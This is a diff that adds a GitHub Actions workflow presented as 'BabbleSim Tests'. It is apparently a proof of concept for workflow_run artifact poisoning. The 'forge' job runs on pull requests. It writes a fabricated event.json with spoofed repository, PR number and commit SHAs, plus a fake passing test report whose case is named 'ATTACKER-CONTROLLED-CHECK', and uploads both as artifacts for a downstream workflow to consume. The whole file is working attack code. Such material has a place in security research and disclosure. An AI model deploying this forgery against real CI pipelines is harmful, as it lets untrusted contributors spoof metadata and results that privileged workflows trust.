@@ -1,0 +1,25 @@
+name: BabbleSim Tests
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: write artifacts
+        run: |
+          mkdir -p event bsim-test-results/suite1
+          jq -c '{repository:{full_name:"PDFtoMark/gab-poc-wfr-artifact", default_branch:"main"}, action:"opened", pull_request:{number: (.number // 1), head:{sha: (.pull_request.head.sha // "deadbeef")}, base:{sha: (.pull_request.base.sha // "cafebabe"), ref:"main"}}}' "$GITHUB_EVENT_PATH" > event/event.json
+          printf '%s\n' '<?xml version="1.0" encoding="UTF-8"?>' '<testsuites><testsuite name="bsim" tests="1" failures="0" errors="0">' '<testcase name="ATTACKER-CONTROLLED-CHECK" classname="poc" time="0.1"/></testsuite></testsuites>' > bsim-test-results/suite1/bsim_results.xml
+          ls -R event bsim-test-results
+      - name: upload event
+        uses: actions/upload-artifact@v4
+        with:
+          name: event
+          path: event/event.json
+      - name: upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: bsim-test-results
+          path: bsim-test-results/suite1/bsim_results.xml
